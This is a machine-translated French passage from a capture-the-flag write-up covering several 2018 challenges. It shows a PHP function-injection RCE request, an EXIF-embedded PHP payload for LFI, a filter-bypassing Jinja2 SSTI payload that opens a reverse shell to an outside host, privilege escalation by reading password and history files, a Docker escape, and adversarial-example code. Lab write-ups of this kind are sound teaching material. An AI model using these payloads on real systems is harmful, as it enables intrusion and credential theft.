Basic.  Compl√®tement inutile, il n'imprime que des cordes: <br>  <i>F√©licitations.</i>  <i>Vous pouvez maintenant lire les sources.</i>  <i>Allez plus loin.</i> </li><li>  Fonction Injection (FI) sur l'entr√©e ' <i>filtre</i> '. </li><li>  La validation du t√©l√©chargement d'images est maintenant claire pour nous. </li><li>  La biblioth√®que ImageMagic est utilis√©e.  En supposant qu'il soit utilis√© pour l'exploit est une impasse.  Je ne pense pas qu'il y ait moyen de l'exploiter sans compter sur FI. </li></ul><br><h4>  Vuln√©rabilit√©: Function Injection </h4><br>  Le fichier <b>upload.php</b> contient un code suspect: <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br>  Nous pouvons le simplifier pour: <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br>  Vous pouvez r√©ellement d√©tecter cette vuln√©rabilit√© simplement en faisant du fuzzing.  L'envoi de noms de fonctions comme " <b>var_dump</b> " ou " <b>debug_zval_dump</b> " dans l'entr√©e " <i>filter</i> " entra√Ænera des r√©ponses int√©ressantes du serveur. <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br>  Mais ce n'est pas notre cas.  Il existe au moins deux fa√ßons de r√©soudre la t√¢che. <br><br><h4>  vecteur filter_input_array (solution non intentionnelle): vecteur RCE </h4><br>  En r√©fl√©chissant aux moyens possibles d'obtenir RCE, j'ai remarqu√© que la <code>function filter_input_array</code> nous donne un assez bon contr√¥le sur la <code>$filterImage variable</code> . <br><br>  Passer un <b>tableau de filtres</b> comme deuxi√®me argument permettra de construire un tableau arbitraire sur le r√©sultat de la fonction. <br><br>  Mais ImageMagic ne s'attend pas √† obtenir autre chose que la classe Imagick.  :( <br><br>  Peut-√™tre que nous pouvons d√©s√©rialiser la classe de l'entr√©e?  Cherchons des arguments de filtre suppl√©mentaires dans la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">description de filter_input_array</a> . <br><br>  Il n'est pas mentionn√© sur la page de fonction elle-m√™me, mais nous pouvons en fait passer un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rappel pour la validation des entr√©es</a> .  L'exemple FILTER_CALLBACK est pour <code>filter_input</code> , mais il fonctionne aussi pour <code>filter_input_array</code> ! <br><br>  Cela signifie que nous pouvons "valider" les entr√©es utilisateur personnalis√©es en utilisant la fonction avec un argument (eval? System?), Et nous avons le contr√¥le sur l'argument. <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br>  Exemple pour obtenir RCE: <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br>  R√©ponse: <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  Ligne <b>recherch√©e</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br>  Quelque chose se sentait vraiment mal, car pourquoi aurions-nous m√™me besoin d'obtenir le code source?  Juste pour un indice?  Pourquoi les fichiers t√©l√©charg√©s ont √©t√© stock√©s sur le disque, n'est-il pas plus pratique de ne pas stocker les fichiers ind√©sirables des utilisateurs du d√©fi? <br><br>  La co√Øncidence dans la d√©nomination <b>filter</b> = <b>filter</b> _input_array, text [a] [ <b>filter</b> ] m'a donn√© la certitude que tout a √©t√© fait comme pr√©vu (" <b>filtres</b> jamais vus auparavant", cochez ‚úì). <br><br><h4>  vecteur spl_autoload: vecteur LFI </h4><br>  Apr√®s avoir soumis la solution, j'ai √©t√© contact√© par l'un des auteurs du d√©fi, qui a dit que mon vecteur n'√©tait pas destin√© et qu'une autre fonction peut √™tre utilis√©e ( <code>spl_autoload</code> ): <br><br>  La fa√ßon dont nous pouvons utiliser cette fonction n'est pas √©vidente car elle est cens√©e charger une classe "&lt;class_name&gt;" √† partir du fichier nomm√© "&lt;class_name&gt; &lt;some_extension&gt;".  La signature est la suivante: <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br>  Notre premier argument ne peut √™tre que le nombre (1-512), donc le <i>nom de</i> la <i>classe</i> est un ... nombre? ... bizarre. <br>  <i>L'</i> argument d' <i>extension</i> semble √©galement inutilisable, les fichiers contr√¥l√©s sont d'un niveau plus profond que <b>upload.php</b> (nous devons passer un pr√©fixe). <br><br>  Cette fonction peut r√©ellement nous donner un LFI si elle est utilis√©e de cette fa√ßon: <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br>  Le nom du r√©pertoire est acquis √† partir du code source divulgu√©.  Et nous avons eu de la chance, car si le premier caract√®re du nom √©tait autre que le num√©ro -&gt; nous ne pouvions pas inclure de fichiers √† partir de l√†. <br><br>  Donc ... tout ce dont nous avons besoin maintenant est de passer un "type de validit√©" ( <b>getimagesize</b> doit l'accepter) <b>*</b> Fichier <b>.jpg</b> avec du code php modifi√©.  Un exemple simple (charge utile php dans exif) est joint. <br><br>  T√©l√©chargez-le en tant que <i>1111.jpg</i> et faites: <br><br>  OBTENEZ: <br>  a = / get_the_flag <br><br>  POST: <br>  filter = spl_autoload <br>  taille = 51 <br>  text = a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br>  soumettre = 1 <br><br>  R√©ponse: <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  Ligne <b>recherch√©e</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br>  Le t√©l√©chargement et LFI peuvent √™tre effectu√©s en une seule demande. <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a>  Jour 5.  Le temps </h2><br>  Cette t√¢che a √©t√© pr√©par√©e par <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">l'√©quipe de s√©curit√© num√©rique</a> <br>  <i>La premi√®re chose dont vous avez besoin est de ma√Ætriser le temps, la seconde est d'aller au-del√† du petit monde.</i>  <i>Apr√®s cela, vous obtiendrez une arme contre le niveau final du boss.</i>  <i>Bonne chance!</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>Astuces</b> <br>  <i><b>27/10/2018 16:00</b></i> <i><br></i>  <i>Oh, combien d'appareils sur une bo√Æte ... sont-ils vraiment utiles?</i> <i><br></i>  <i><b>27/10/2018 14:35</b></i> <i><br></i>  <i>Si vous avez pu g√©rer le filtre sur le panneau de temps, vous pouvez utiliser les capacit√©s d'un syst√®me complet.</i>  <i>Ne soyez pas timide.</i> <i><br></i>  <i><b>27/10/2018 14:25</b></i> <i><br></i>  <i>V√©rifiez l'h√¥te virtuel et ne vous attardez pas sur 200</i> <i><br></i>  <i><b>26/10/2018 19:25</b></i> <i><br></i>  <i>La t√¢che n'a pas √©t√© r√©solue.</i>  <i>24 heures suppl√©mentaires.</i> <i><br></i>  <i><b>26/10/2018 17:35</b></i> <i><br></i>  <i>Utilisez toutes vos capacit√©s.</i> <i><br></i>  <i><b>26/10/2018 12:25</b></i> <i><br></i>  <i>Vous n'avez besoin d'aucun logiciel m√©dico-l√©gal pour effectuer une √©tape d'une t√¢che.</i> <br><br><h4>  1) Wordpress </h4><br>  Initialement, on nous a donn√© l'adresse <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">51.15.75.80</a> . <br>  Nous ex√©cutons hehdirb - nous voyons le r√©pertoire / wordpress /.  Acc√©dez imm√©diatement au panneau d' <i>administration</i> sous <i>admin: admin</i> . <br>  Dans le panneau d'administration, nous voyons qu'il n'y a pas de privil√®ges pour modifier les mod√®les, vous ne pouvez donc pas simplement obtenir RCE.  Cependant, il existe un message cach√©: <br>  <i>25/09/2018 PAR L'ADMINISTRATEUR</i> <i><br></i>  <i>Priv√©: Notes sur le panneau de temps</i> <i><br></i>  <i>connexion: cristopher</i> <i><br></i>  <i>mot de passe: L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>h√¥te: timepanel.zn</i> <br><br><h4>  2) SSTI </h4><br>  √âvidemment, vous devez vous rendre sur le m√™me serveur en sp√©cifiant l'h√¥te virtuel <b>timepanel.zn.</b> <br>  Nous d√©marrons hehdirb sur cet h√¥te - nous voyons le r√©pertoire / adm_auth, nous allons sous le login et le mot de passe donn√©s ci-dessus.  Nous voyons le formulaire dans lequel vous devez entrer les dates ("de" et "√†") pour obtenir des informations.  En m√™me temps, nous voyons un commentaire dans le code HTML de r√©ponse o√π les m√™mes dates sont refl√©t√©es: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  De toute √©vidence, le bogue ici devrait probablement √™tre li√© √† cette r√©flexion, et il est peu probable qu'il soit XSS, alors essayez SSTI: <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br>  La r√©ponse est: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  En envoyant {{self}}, {{'a' * 5}}, nous r√©alisons qu'il s'agit de <b>Jinja2</b> , mais les vecteurs standard ne fonctionnent pas.  En envoyant des vecteurs sans {{parenth√®ses}}, nous voyons que la r√©ponse ne refl√®te pas les caract√®res "_" et certains mots, par exemple, "classe".  Ce filtre est facilement contourn√© gr√¢ce √† l'utilisation de request.args et de la construction | attr (), ainsi qu'au codage de certains octets avec une s√©quence d'√©chappement. <br><br><div class="spoiler">  <b class="spoiler_title">Requ√™te finale pour backconnect</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3) LPE </h4><br>  Apr√®s avoir re√ßu RCE, nous comprenons que vous devez √©lever les privil√®ges √† root.  Il y a plusieurs faux chemins (/ usr / bin / special, /opt/privesc.py et quelques autres) que je ne veux pas d√©crire, car ils ne prennent que du temps.  Il existe √©galement un binar / usr / bin / zero, qui n'a pas de bit suid, mais il s'av√®re qu'il peut lire n'importe quel fichier (il suffit de lui envoyer le chemin au format hexad√©cimal dans stdin). <br><br>  La raison en est les capacit√©s (/ usr / bin / zero = cap_dac_read_search + ep). <br>  Nous lisons l'ombre, d√©finissons le hachage √† brosser, mais pendant qu'il est bross√©, nous supposons que nous devons lire le fichier d'un autre utilisateur qui est sur le syst√®me: <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>Je peux lire quelque chose pour toi</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4) Docker escape / Forensics </h4><br>  Donc, nous avons une racine.  Mais ce n'est pas la fin.  Nous <i>mettons apt install extundelete</i> et trouvons plusieurs fichiers plus int√©ressants dans le syst√®me de fichiers qui sont li√©s √† l'√©tape suivante: <br><br>  <i>Pour obtenir un ticket, vous devez modifier une image afin qu'elle soit identifi√©e comme "1".</i>  <i>Vous avez un mod√®le et une image.</i>  <i>curl -X POST -F image=@ZeroSource.bmp 'http://51.15.100.188 {6491 / pr√©dire'.</i> <br><br>  Donc, nous sommes maintenant confront√©s √† la t√¢che standard de g√©n√©rer un exemple comp√©titif pour le mod√®le d'apprentissage automatique.  Cependant, √† ce stade, je n'ai toujours pas pu obtenir tous les fichiers dont j'avais besoin.  Cela n'√©tait possible qu'en mettant l'agent R-Studio sur le serveur et en s'attaquant √† la criminalistique √† distance.  Ayant presque retir√© ce dont j'avais besoin, j'ai d√©couvert qu'en fait, le conteneur Docker fonctionne dans un mode qui vous permet de monter le disque entier <br><br>  Nous cr√©ons mount / dev / vda1 / root / kek et obtenons l'acc√®s au syst√®me de fichiers h√¥te, et en m√™me temps l'acc√®s root √† l'ensemble du serveur (puisque nous pouvons mettre notre propre cl√© ssh).  Nous supprimons KerasModel.h5, ZeroSource.bmp. <br><br><h4>  5) ML contradictoire </h4><br>  Il ressort imm√©diatement de l'image que le r√©seau neuronal est form√© sur l'ensemble de donn√©es MNIST.  Lorsque nous essayons d'envoyer une image arbitraire au serveur, nous obtenons la r√©ponse que les images diff√®rent trop.  Cela signifie que le serveur mesure la distance entre les vecteurs, car il veut exactement un exemple contradictoire, et pas seulement une image avec l'image ¬´1¬ª. <br><br>  Nous essayons la premi√®re attaque que nous obtenons de foolbox - nous obtenons le vecteur d'attaque, mais le serveur ne l'accepte pas (la distance est trop grande).  Ensuite, je suis all√© dans la nature, en commen√ßant √† refaire les impl√©mentations de One Pixel Attack sous MNIST, et rien n'a fonctionn√©, puisque cette attaque utilise l'algorithme d'√©volution diff√©rentielle, elle n'est pas en gradient et essaie de trouver le minimum stochastiquement, guid√© par des changements dans le vecteur de probabilit√©.  Mais le vecteur de probabilit√©s n'a pas chang√©, le r√©seau neuronal √©tant trop confiant. <br><br>  En fin de compte, je devais me souvenir de l'indice qui se trouvait dans le fichier texte d'origine sur le serveur - "(Normilize ^ _ ^)".  Apr√®s une normalisation minutieuse, il a √©t√© possible de r√©aliser efficacement l'attaque en utilisant l'algorithme d'optimisation L-BFGS, voici l'exploit final: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  Ligne <b>recherch√©e</b> : <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a>  Jour 6.  Awesome vm </h2><br>  Cette t√¢che a √©t√© pr√©par√©e par l'√©quipe du <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">CTF de l'√©cole</a> . <br>  <i>D√©couvrez un nouveau service de formation!</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>En ce moment, nous voulons vous engager dans un b√™ta-test d'une nouvelle machine virtuelle cr√©√©e sp√©cialement pour tester les comp√©tences de programmation de nos d√©butants.</i>  <i>Nous avons ajout√© une protection intellectuelle contre la tricherie et souhaitons maintenant tout v√©rifier soigneusement avant de proposer la plateforme.</i>  <i>La VM vous permet d'ex√©cuter des programmes simples ... ou pas seulement?!</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>Astuces</b> <br>  <i><b>27/10/2018 16:20</b></i> <i><br></i>  <i>Peut-√™tre pouvez-vous tromper ou contourner le syst√®me d'IA?</i> <br><br><h4>  Description: </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br>  Le service est un syst√®me de validation des fichiers avec l'extension .cmpld accept√© par l'interpr√©teur sibVM.  La t√¢che que le programme envoy√© doit r√©soudre: calculer la somme des nombres r√©pertori√©s dans le fichier input.txt, rappelant quelque peu une comp√©tition acm.  De plus, la description de l'interface Web indique que les programmes envoy√©s seront v√©rifi√©s √† l'aide de l'intelligence artificielle. <br><br>  Le service se compose de deux conteneurs Docker: <b>web-docker</b> et <b>prod_inter</b> . <br><br>  <b>web-docker n'est</b> pas particuli√®rement int√©ressant pour l'analyse.  Il ne fait que traduire le fichier envoy√© dans le conteneur prod_inter, √† l'int√©rieur duquel se produit tout ce qui est le plus int√©ressant.  L'extrait de code correspondant est pr√©sent√© ci-dessous: <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br>  Dans le conteneur <b>prod_inter</b> , le fichier envoy√© est v√©rifi√© et ex√©cut√© sur les donn√©es de test.  Pour chaque envoi, un nouveau r√©pertoire est cr√©√© dans / tmp / au hasard, o√π le fichier envoy√© est enregistr√© sous un nom al√©atoire.  Le fichier flag.txt est √©galement plac√© dans le r√©pertoire cr√©√©, ce qui est probablement notre objectif. <br><br>  Ensuite, la partie amusante commence: si le fichier est sup√©rieur √† 8192 octets, le fichier d'entr√©e du programme est v√©rifi√© √† l'aide de l'intelligence artificielle.  L'IA est un r√©seau neuronal ultrapr√©cis pr√©-form√©.  Si le test a r√©ussi (les donn√©es d'entr√©e d√©passent 8192 octets et le r√©seau de neurones les a attribu√©es √† la premi√®re classe), le programme s'ex√©cute sur cinq tests diff√©rents et le r√©sultat est envoy√© dans un message de r√©ponse et affich√© √† l'utilisateur. <br><br>  Si la taille des donn√©es d'entr√©e est inf√©rieure √† 8192 octets, ou s'ils n'ont pas r√©ussi le test par le r√©seau de neurones, puis avant de tester le programme v√©rifie la pr√©sence de la sous-cha√Æne flag.txt et les tentatives d'ouverture d'un fichier du m√™me nom.  L'acc√®s au fichier flag.txt est contr√¥l√© en ex√©cutant le programme dans le sandbox <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">secfilter</a> , qui est bas√© sur les technologies <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SECCOMP</a> , et en analysant le journal d'ex√©cution.  Vous trouverez ci-dessous le code de service correspondant et un exemple de journal lorsque vous essayez d'ouvrir un fichier interdit: <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br>  Pour r√©soudre cette t√¢che, j'ai g√©n√©r√© un ensemble de programmes pour l'interpr√©teur sibVM qui ouvrent le fichier flag.txt et affichent la valeur num√©rique du i√®me octet du fichier.  En m√™me temps, chaque programme r√©ussit le test AI.  Ensuite, une analyse de surface du r√©seau neuronal et une description de la machine virtuelle seront pr√©sent√©es. <br><br><h4>  Analyse de r√©seau neuronal </h4><br>  Le mod√®le de r√©seau neuronal form√© est contenu dans le fichier cnn_model.h5.  Voici des informations g√©n√©rales sur l'architecture du r√©seau. <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br>  Nous ne savons pas exactement ce que le r√©seau de neurones reconna√Æt, nous allons donc essayer de lui fournir diverses donn√©es.  De l'architecture du r√©seau, il est clair qu'√† l'entr√©e il re√ßoit une image monocanal de taille 100X100.  Pour √©viter l'effet de mise √† l'√©chelle sur le r√©sultat, nous utiliserons des s√©quences de 10 000 octets convertis en une image en utilisant les fonctions utilis√©es dans le service.  Voici les r√©sultats du fonctionnement d'un r√©seau de neurones sur diverses donn√©es: <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br>  Sur la base des r√©sultats, on peut supposer que le r√©seau neuronal recevra des images avec une pr√©dominance de couleurs noires (z√©ro octet).  Tr√®s probablement, l'√©criture d'un programme qui lit les caract√®res d'indicateur n√©cessitera beaucoup moins de 1000 octets significatifs (le reste peut √™tre rempli de z√©ros), puis l'IA acceptera le programme envoy√©. <br><br>  En cons√©quence, pour r√©soudre la t√¢che, il reste √† √©crire le programme souhait√©. <br><br><h4>  Interpr√®te SibVM </h4><br>  <b>Structure du programme</b> <br>  La premi√®re √©tape consiste √† comprendre la structure du fichier programme.  Au cours de l'inverse de l'interpr√©teur, il s'est av√©r√© que le programme devrait commencer par un certain en-t√™te avec plusieurs champs de service, suivi d'un ensemble d'entit√©s avec des identifiants, parmi lesquels il devrait y avoir une entit√© principale de type Function. <br><br><div class="spoiler">  <b class="spoiler_title">V√©rification d'en-t√™te de fichier</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">R√©cup√©ration des enregistrements</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Traitement des enregistrements et lancement de la fonction principale</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br>  Le r√©sultat est le format de fichier d'entr√©e suivant: <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4>  Types de donn√©es </h4><br>  L'interpr√©teur prend en charge diff√©rents types d'entit√©s.  Vous trouverez ci-dessous un tableau et leurs identifiants, qui seront √† l'avenir n√©cessaires pour construire le programme. <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4>  Construire un programme pour l'interpr√®te </h4><br>  Comme mentionn√© ci-dessus, le programme doit avoir une entr√©e principale avec le type Fonction (5).  Il a le format suivant: <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br>  Il n'a pas √©t√© difficile de conna√Ætre le cycle d'ex√©cution principal du programme. <br><br><div class="spoiler">  <b class="spoiler_title">Cycle d'ex√©cution principal</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  La fonction <code>decode_opcode</code> r√©cup√®re des informations sur la prochaine op√©ration √† partir du code de programme.  Les deux premiers octets de chaque op√©ration contiennent le code de l'op√©ration, le nombre d'arguments et leur type.  Les octets suivants (selon le type et le nombre d'arguments) seront interpr√©t√©s comme des arguments de l'op√©ration. <br><br>  Le format des deux premiers octets de l'op√©ration: <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br>  Ensuite, nous passerons en revue certaines instructions qui nous aideront √† extraire l'indicateur du syst√®me. <br><br><div class="spoiler">  <b class="spoiler_title">Graphique d'interpr√©teur de commandes, fonction execute_opcode</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li>  Opcode 0 - ouvre le fichier (le nom du fichier est sp√©cifi√© par l'argument d'op√©ration et est de type String) et place son contenu en haut de la pile en tant qu'objet de type <code>ByteArray</code> . </li><li>  Opcode 2 - Affiche la valeur stock√©e en haut de la pile.  Malheureusement, cette op√©ration n'affichera pas la valeur d'un objet de type <code>ByteArray</code> .  Pour r√©soudre ce probl√®me, vous pouvez obtenir le i-√®me √©l√©ment du tableau et l'afficher. </li></ul><br><div class="spoiler">  <b class="spoiler_title">Traitement de l'opcode 2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li>  Opcode 13 - prendre un √©l√©ment d'un tableau par index.  Le tableau et l'index des √©l√©ments sont extraits de la pile, le r√©sultat est pouss√© sur la pile.  En cons√©quence, pour compiler un programme de travail, il est n√©cessaire de mettre l'index sur la pile. </li><li>  Opcode 7 - pousse l'argument d'op√©ration sur la pile. </li></ul><br>  En cons√©quence, le programme se compose de seulement 4 op√©rations: <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">Programme final</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br>  Ligne recherch√©e: <b>flag {76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a>  